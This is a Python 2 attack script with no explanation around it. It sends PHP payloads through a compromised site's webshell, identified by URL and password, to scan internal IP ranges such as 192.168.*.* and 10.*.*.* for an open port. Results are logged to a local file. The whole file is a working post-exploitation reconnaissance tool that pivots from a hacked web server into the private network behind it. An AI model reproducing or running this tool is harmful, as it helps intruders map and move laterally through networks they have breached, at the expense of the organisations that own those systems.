# coding=utf-8
import os,Queue,threading,argparse,time,os,requests,re
parser = argparse.ArgumentParser();
parser.add_argument("-url",nargs="+",help="http://xxx.com/1.php password // webshell and password");
parser.add_argument("-p",help="-p 3306  //can only fill a port  ",type=int);
parser.add_argument("-t",help="-t 10 //thread",type=int);
args = parser.parse_args()
pat = os.path.dirname(os.path.abspath(__file__)).replace("\\","/");
url,passw,p,t = args.url[0],args.url[1],args.p,args.t,
n,y = 0,255


if url and passw and p and t:
	try:
		print 'help --> ip: 192.168.1.*  or 192.168.*.*  or 10.*.*.* PS: The asterisk represents 1бл255 \r\n'
		ip = raw_input("ip:");
		q = Queue.Queue(t);
		ip_l = ip.split('.');
		if len(ip_l) < 1 or t > 101:
			print 'IP error! or t > 101';
			exit()
		else:
			for int_i in ip_l:
				if int_i != "*":
					if not int_i.isdigit() or len(int_i) >= 4 or int_i>255 and int_i<0:
						print "ip error!";
						exit();
	except:
			print '\r\nerror: IP input error \r\n '
			exit();
def IsOpenport(ip):
	try:
		print 'iP: %s --%i--> inspect \r\n' % (ip,p)
		header2 = {
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Encoding':'gzip, deflate, br',
		'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
		'Connection':'keep-alive',
		'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0'};
		payload = "$ip = '%s';$fp = @fsockopen($ip,'%s',$errno,$errstr,5);if($fp){echo 'swqqsw21xxx';}"% (ip,p);
		canshu  = {passw:payload};
		r = requests.post(url,data=canshu,timeout=20);
		html = r.text.encode('utf-8'); 
		if re.findall('swqqsw21xxx',html):
			print 'iP: %s --%i--> open \r\n' % (ip,p)
			f=open(pat+'/ip_port.txt','a')
			f.write("%s ---%i--> is open \r\n" % (ip,p) )
			f.close()
		
	except Exception,e:
		print " Error type %s detailed: %s   \r\n" % (Exception,e)
	q.get()



if ip_l[0] == "172" and ip_l[1] == "*":
	n,y=16,32
elif ip_l[0] == "192" and ip_l[1] == "*":
	n,y=168,169
for x1 in xrange(n,y):
	ip1 = ip.replace("*",str(x1),1);
	ip1_count = ip.count('*');
	
	if ip1_count == 1:
		while True:
			if not q.full():
				t = threading.Thread(target=IsOpenport,args=[ip1]).start();
				q.put(1)
				break;
			else:
				time.sleep(0.2)
	if ip1_count >= 2:
		for x2 in xrange(0,255):
			ip2 = ip1.replace("*",str(x2),1);
			if ip1_count == 2:
				while True:
					if not q.full():
						t = threading.Thread(target=IsOpenport,args=[ip2]).start();
						q.put(1)
						break;
					else:
						time.sleep(0.2)
			if ip1_count == 3:
				for x3 in xrange(0,255):
					ip3 = ip2.replace("*",str(x3),1);				
					while True:
						if not q.full():
							t = threading.Thread(target=IsOpenport,args=[ip3]).start();
							q.put(1)
							break;
						else:
							time.sleep(0.2)



